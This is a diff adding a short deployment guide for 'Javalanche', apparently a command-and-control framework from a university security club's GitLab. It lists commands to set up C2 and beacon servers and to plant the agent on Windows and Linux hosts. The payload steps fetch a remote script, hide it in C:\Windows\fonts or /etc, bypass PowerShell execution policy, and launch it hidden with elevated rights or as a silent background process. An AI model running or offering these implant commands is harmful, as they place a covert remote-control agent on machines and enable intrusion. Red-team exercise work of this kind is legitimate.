@@ -1,0 +1,49 @@
+To The following file contains documentation to manually deploy the agent, proxy server, or C2 server on both Windows and Linux.
+
+Windows C2 Server
+
+ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
+ps> .\setup.ps1
+
+
+Windows Long Range Beacon Server
+
+ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
+ps> .\setup.ps1 -server Beacon
+
+
+Windows Payload
+
+ps> wget -o C:\Windows\fonts\Javalanche.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.ps1?ref_type=heads"
+ps> Start-Process -FilePath "powershell.exe" -ArgumentList "set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress {IP Address of Beacon}" -WindowStyle Hidden -Verb RunAs
+
+
+Linux C2 Server
+
+$ sudo apt update
+$ sudo apt install curl
+$ sudo mkdir /home/javalanche
+$ cd /home/javalanche
+$ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.sh?ref_type=heads
+$ sudo chmod +x serverSetup.sh
+$ sudo ./serverSetup.sh
+
+
+Linux Long Range Beacon Server
+
+$ sudo apt update
+$ sudo apt install curl
+$ sudo mkdir /home/javalanche
+$ cd /home/javalanche
+$ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.sh?ref_type=heads
+$ sudo chmod +x serverSetup.sh
+$ sudo ./serverSetup.sh -server Beacon
+
+
+Linux Payload
+
+$ sudo apt update
+$ sudo apt install curl
+$ sudo curl -o /etc/javalanche.sh "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
+$ sudo chmod +x /etc/javalanche.sh
+$ sudo -b nohup /etc/javalanche.sh {IP Address of Beacon} >/dev/null 2>&1
